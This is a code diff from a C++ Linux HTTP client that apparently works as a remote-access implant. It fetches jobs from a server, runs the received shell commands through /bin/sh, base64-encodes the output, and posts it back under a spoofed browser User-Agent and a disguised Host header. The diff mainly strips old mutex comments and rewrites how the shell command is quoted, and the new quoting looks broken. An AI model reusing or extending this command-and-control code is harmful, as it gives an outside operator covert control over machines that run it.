@@ -59,10 +59,6 @@ bool isJobAvailable(const std::wstring &replyFromServer){
 
 void startJob(SharedResourceManager &sharedResources){
           
-    // jobQueueMutex.lock();
-    // std::wstring job (jobQueue.front());
-    // jobQueue.pop();
-    // jobQueueMutex.unlock();
     std::wstring job = sharedResources.popJob();
     std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?DataSignal\r\nAccept-Encoding: gzip, deflate, br\r\nUser-Agent: chromium/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\n";
     std::wstring dataToSend;
@@ -338,7 +334,6 @@ void startJob(SharedResourceManager &sharedResources){
         }                               
     }
     else if (mode == L"shell") {
-
         std::wstring RecievedCommand{ json_ExtractValue(job, L"command") };
         RecievedCommand = ReplaceTildeWithPath(RecievedCommand);
         std::wstring cd{ json_ExtractValue(job, L"cd") };
@@ -357,7 +352,7 @@ void startJob(SharedResourceManager &sharedResources){
         }
         else {
             if(!RecievedCommand.empty()){
-            std::wstring command = L"/bin/sh -c \"cd " + currentPath.wstring() + L" && " + RecievedCommand + L"\"";
+            std::wstring command = L"/bin/sh -c cd \"" + currentPath.wstring() + L"\" && " + RecievedCommand;
             std::wstring emptyString;
             dataToSend = executeCommand(L"/bin/sh", command, emptyString);
             }
@@ -374,13 +369,9 @@ void startJob(SharedResourceManager &sharedResources){
     dataToSend = s2ws(base64_encode((unsigned char*)dataToSendStr.c_str(), dataToSendStr.length()));
     std::wstringstream contentLengthStream;
     contentLengthStream << dataToSend.length();
-    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
-   
+    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";  
     request += L"Connection: close\r\n"; 
     request += L"\r\n" + dataToSend;
     
     sharedResources.pushResponse(request);
-    // responseQueueMutex.lock();
-    // responseQueue.push(request);
-    // responseQueueMutex.unlock();
 }
